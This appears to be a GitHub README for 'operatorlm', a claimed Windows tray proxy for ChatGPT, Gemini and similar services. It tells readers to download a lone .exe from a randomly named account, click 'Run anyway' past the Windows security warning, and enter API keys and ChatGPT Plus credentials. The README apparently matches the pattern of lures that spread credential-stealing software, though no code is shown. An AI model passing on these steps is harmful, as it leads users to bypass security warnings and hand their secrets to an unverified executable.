# 🤖 operatorlm - Run local AI proxies with ease

[![Download operatorlm](https://img.shields.io/badge/Download-operatorlm-blue.svg)](https://github.com/Doublefaced-flavoursomeness591/operatorlm)

operatorlm acts as a bridge between your computer and web-based artificial intelligence services. It manages your connections to tools like ChatGPT and Gemini. This software runs directly on your machine as a small, single file. It handles account switching and connection errors automatically. You keep your login secrets secure within your system’s built-in storage.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://github.com/Doublefaced-flavoursomeness591/operatorlm) to download the application.
2. Look for the file ending in `.exe` labeled for Windows.
3. Save the file to a folder where you store your programs.
4. Double-click the file to start the application.

If Windows shows a security prompt, click "More info" and then select "Run anyway." The application runs in the background. Look for the tray icon near your clock in the taskbar.

## ⚙️ System Requirements

operatorlm runs on most modern Windows systems. Ensure your machine meets these specifications for the best experience:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 50MB of free disk space.
* Standard user permissions.

You do not need to install complex runtimes or containers like Docker. The application contains everything it needs to function within that one file.

## 🔑 Security and Secrets

Security remains a primary focus of this tool. operatorlm avoids storing your passwords or API keys in text files on your drive. Instead, it uses your operating system’s keyring. This matches the method your web browser uses to store saved passwords.

When you connect a new account, the app asks for your credentials. It sends these to the Windows Credential Manager. From that point, the app fetches the keys securely when it needs to talk to the AI service.

## 🔄 Using the Proxy

The software acts as a proxy. This means other programs send requests to operatorlm, and operatorlm forwards these requests to your chosen AI model. 

* **Setup:** Right-click the tray icon and select "Settings."
* **Add Account:** Enter your API keys as requested by the interface.
* **Failover:** If one AI service becomes slow or stops responding, the tool switches to your backup service automatically. This ensures your work continues without manual interference.
* **Aliasing:** Assign short names to your accounts. This helps you select the right provider for your specific task.

## 🛠 Features

* **Single File:** The entire program fits into an 11MB executable.
* **No Docker:** Forget about learning container technology. Just run the file.
* **Multi-Account:** Switch between several AI providers or accounts within one interface.
* **OS Keyring:** Keep your data safe using built-in Windows security.
* **Tray Integration:** The app stays out of your way and runs quietly in the taskbar.
* **Smart Failover:** The app detects connection drops and tries a secondary route to ensure high uptime.

## 📂 Managing Connections

The dashboard allows for granular control over your connections. Open the settings menu to view your active aliases. You can enable or disable specific providers with one click. 

If you want to use ChatGPT Plus as a backend, select that provider from the list and input your credentials. The software validates the connection immediately. If successful, a green light appears next to the provider name in the menu.

## 📈 Troubleshooting

Sometimes connection issues arise due to network settings or expired keys. 

* **Check Internet:** Ensure your computer has an active web connection.
* **Verify Keys:** If a provider shows a red status, open settings and re-enter your API key. Keys often expire, and you may need to generate a new one from your provider’s dashboard.
* **Check Logs:** Right-click the tray icon to view the log file. This text file records recent activity and explains why a specific connection failed.
* **Restart the App:** Right-click the icon and choose "Exit," then run the file again. This often resolves minor conflicts.

## 🌐 Compatible Services

operatorlm supports a wide range of services. The proxy configuration works with any OpenAI-compatible interface.

* **OpenAI:** Includes access to GPT-4o and other models.
* **Azure OpenAI:** Connect your enterprise-grade cloud endpoints.
* **Gemini:** Access Google models through the proxy.
* **OpenRouter:** Use competitive routing for multiple models.
* **Ollama:** Link your own locally hosted models.

Updating your list of services happens via the settings file or the graphical interface in the tray menu. You can add as many providers as you need.

## 📋 Frequently Asked Questions

* **Does this track my data?** No. All communication happens between your system and the AI provider you select. operatorlm does not store your history or prompts.
* **Can I use this on multiple machines?** Yes. You can download the file on any machine. Note that your keys remain stored in the local Windows keyring of each specific computer.
* **Is this a free tool?** The software is free to use. However, the AI providers you connect to may charge for their services based on your usage.
* **Do I need developer skills?** No. The app uses a simple graphical interface for all configuration tasks. You do not need to write code or use a terminal window.

## 📝 Support

The community maintains this project. If you encounter bugs or want to request a feature, [visit the official repository](https://github.com/Doublefaced-flavoursomeness591/operatorlm). Open an issue to report problems. Provide as much detail as possible, such as your version of Windows and the specific error message, to help us assist you.

Always ensure you run the most recent version of the binary. Check the release page periodically for improvements and security patches. Keeping your app updated ensures compatibility with upcoming changes to AI provider APIs.